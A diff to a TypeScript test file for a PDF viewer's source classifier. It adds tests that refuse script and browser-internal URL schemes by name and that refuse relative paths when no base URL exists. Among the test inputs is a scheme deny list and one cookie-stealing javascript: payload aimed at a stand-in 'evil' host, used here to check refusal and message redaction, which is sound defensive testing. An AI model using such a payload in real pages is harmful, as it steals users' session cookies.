@@ -1,5 +1,6 @@
 /*
- * FR-38: the source heuristic, asked out loud.
+ * FR-38: the source heuristic, asked out loud. Also the regression guard for FR-01's classification clause,
+ * which is the same rule seen from the other side: what a string must be refused for, and why.
  *
  * A host holding a string from an upload widget, a query parameter or a JSON payload has to decide what it
  * is before anything is fetched, and the only honest way to let it do that is for the question it asks to
@@ -12,7 +13,7 @@
  * input, and a classifier that throws is a classifier the host has to wrap in a try/catch — at which point
  * it may as well call the loader and catch that.
  */
-import { describe, expect, it } from 'vitest';
+import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 import { isPdfError, PdfError } from './errors';
 import { readFileSync } from 'node:fs';
 import { join } from 'node:path';
@@ -21,6 +22,7 @@ import {
   classifySource,
   normalizeSource,
   type PdfSourceClassification,
+  resolveSourceUrl,
 } from './source';
 
 /** Long enough to clear the base64 threshold, and a multiple of 4. */
@@ -31,7 +33,27 @@ const BASE64_PDF = readFileSync(join(process.cwd(), 'playground', 'fixtures', 'o
 /** Just under the line: 124 characters, a multiple of 4, pure alphabet, and no path in it. */
 const BASE64_TOO_SHORT = 'A'.repeat(124);
 
+const BASE = 'https://app.example/reports/index.html';
+
+/**
+ * A page to resolve a relative address against.
+ *
+ * These tests run in the node project, which has no `document`, and FR-01 makes that load-bearing: a relative
+ * source with no base is refused rather than guessed. So the classifications of relative addresses install a
+ * base — the environment they describe — and the base-less answer is asserted on its own further down.
+ */
+function withDocumentBase() {
+  beforeEach(() => {
+    Reflect.set(globalThis, 'document', { baseURI: BASE });
+  });
+  afterEach(() => {
+    Reflect.deleteProperty(globalThis, 'document');
+  });
+}
+
 describe('classifySource — what a string is', () => {
+  withDocumentBase();
+
   it.each([
     'https://files.example.com/contract.pdf',
     'http://localhost:8000/a.pdf',
@@ -160,11 +182,85 @@ describe('classifySource — why a string is not a source', () => {
     expect([...kinds].sort()).toEqual(['bytes', 'refused', 'url']);
   });
 
+  it.each([
+    'javascript:alert(1)',
+    'livescript:x',
+    'vbscript:msgbox(1)',
+    'view-source:https://example.com/a.pdf',
+    'about:blank',
+    'chrome://settings',
+    'chrome-extension://abcdefghijklmnop/content.pdf',
+    'moz-extension://uuid/a.pdf',
+    'resource://pdf.js/a.pdf',
+  ])('refuses the %j scheme by name', (src) => {
+    // The clause is "unsupported schemes are refused with a stable reason code", and "by name" is the point:
+    // before this rule `javascript:alert(1)` was refused only because it happens to have no slash, and
+    // `chrome://settings` classified as a url because a scheme with slashes looked like a path. Both answers
+    // were accidents, and an accident does not survive the next scheme someone pastes in.
+    const classified = classifySource(src);
+    if (classified.kind !== 'refused') throw new Error(`expected a refusal, got ${classified.kind}`);
+    expect(classified.reason).toBe('unsupported-scheme');
+    expect(classified.message).toMatch(/cannot name a document to fetch/);
+  });
+
+  it('refuses a script scheme without echoing its payload', () => {
+    // The message is documented as safe to show and to log, and a `javascript:` string is script text: the
+    // subject names the scheme, and nothing after the colon is repeated.
+    const hostile = 'javascript:fetch("//evil/" + document.cookie)';
+    const classified = classifySource(hostile);
+    if (classified.kind !== 'refused') throw new Error('expected a refusal');
+    expect(classified.message).toContain('the javascript: scheme');
+    expect(classified.message).not.toContain('cookie');
+  });
+
+  it('still accepts a custom scheme that a host registered itself', () => {
+    // A named list of refusals, not an allowlist of every scheme: `my-app://documents/a.pdf` is how a desktop
+    // shell hands a document to a webview, and refusing it would make the rule worse than the hole it closes.
+    expect(classifySource('my-app://documents/a.pdf')).toEqual({
+      kind: 'url',
+      url: 'my-app://documents/a.pdf',
+    });
+  });
+
+  it('refuses a relative address when there is no document base to resolve it against', () => {
+    // The other half of FR-01's sentence: "Relative URLs resolve against the document base URL in a browser
+    // and are refused when no base URL exists." These run with no base installed — Node, a worker, a server
+    // render — and the answer must be a reason code, not a fetch against an origin nobody named.
+    for (const src of [
+      '/files/report.pdf',
+      './relative/report.pdf',
+      '../up-one.pdf',
+      '//cdn.example.com/a.pdf',
+      'documents/report.pdf',
+      'report.pdf',
+    ]) {
+      const classified = classifySource(src);
+      if (classified.kind !== 'refused') throw new Error(`expected a refusal for ${src}`);
+      expect(classified.reason).toBe('no-base-url');
+      expect(classified.message).toMatch(/no document base URL/);
+    }
+  });
+
+  it('resolves a relative address against the base when one exists', () => {
+    // The counterfactual pair: same strings, page present, and the answer flips to `url` — which is what
+    // makes the refusal above a statement about the environment rather than about the string.
+    Reflect.set(globalThis, 'document', { baseURI: BASE });
+    try {
+      expect(classifySource('/files/report.pdf')).toEqual({ kind: 'url', url: '/files/report.pdf' });
+      expect(resolveSourceUrl('./relative/report.pdf')).toBe('https://app.example/reports/relative/report.pdf');
+      expect(resolveSourceUrl('report.pdf')).toBe('https://app.example/reports/report.pdf');
+    } finally {
+      Reflect.deleteProperty(globalThis, 'document');
+    }
+  });
+
   it('refuses a `javascript:` scheme rather than treating it as a URL', () => {
-    // Not in the scheme allow-list, has no slash and no .pdf suffix: the same rule that catches a bare
-    // word catches this, and the message tells the host which string it means.
+    // Kept as its own case because it is the one a reader of the security notes will look for: the refusal is
+    // now by name, so it does not depend on the string happening to lack a slash.
     const classified = classifySource('javascript:alert(1)');
     expect(classified.kind).toBe('refused');
+    if (classified.kind !== 'refused') throw new Error('expected a refusal');
+    expect(classified.reason).toBe('unsupported-scheme');
   });
 });
 
@@ -203,6 +299,8 @@ describe('base64ToBytes', () => {
 });
 
 describe('the classifier and the loader are the same rule', () => {
+  withDocumentBase();
+
   // Labelled so the long base64 case does not become a 30 kB test title.
   const inputs: { label: string; src: string }[] = [
     { label: 'a path', src: '/files/report.pdf' },
@@ -210,6 +308,7 @@ describe('the classifier and the loader are the same rule', () => {
     { label: 'a bare word', src: 'report' },
     { label: 'a windows path', src: 'C:\\Users\\me\\report.pdf' },
     { label: 'an empty string', src: '' },
+    { label: 'a refused scheme', src: 'chrome://settings' },
     { label: 'a base64 document', src: BASE64_PDF },
     { label: 'a base64 data url', src: `data:application/pdf;base64,${BASE64_PDF}` },
     { label: 'base64 just under the line', src: BASE64_TOO_SHORT },
@@ -232,6 +331,22 @@ describe('the classifier and the loader are the same rule', () => {
       return;
     }
     expect(loaded).toEqual({ kind: 'url', url: classified.url });
+  });
+
+  it('agrees about a relative source with no base, which is the refusal a server render will actually meet', async () => {
+    // The one refusal that depends on the environment rather than the string, so the pair is asserted with the
+    // page taken away: a host that checked first and a host that only rendered must read the same sentence.
+    Reflect.deleteProperty(globalThis, 'document');
+    try {
+      const classified = classifySource('/files/report.pdf');
+      if (classified.kind !== 'refused') throw new Error('expected a refusal');
+      const error = await normalizeSource('/files/report.pdf').catch((err: unknown) => err);
+      expect(isPdfError(error, 'INVALID_SOURCE')).toBe(true);
+      expect((error as Error).message).toBe(classified.message);
+      expect(classified.message).toMatch(/no document base URL/);
+    } finally {
+      Reflect.set(globalThis, 'document', { baseURI: BASE });
+    }
   });
 
   it('still applies allowedSources to a url and never to bytes', async () => {
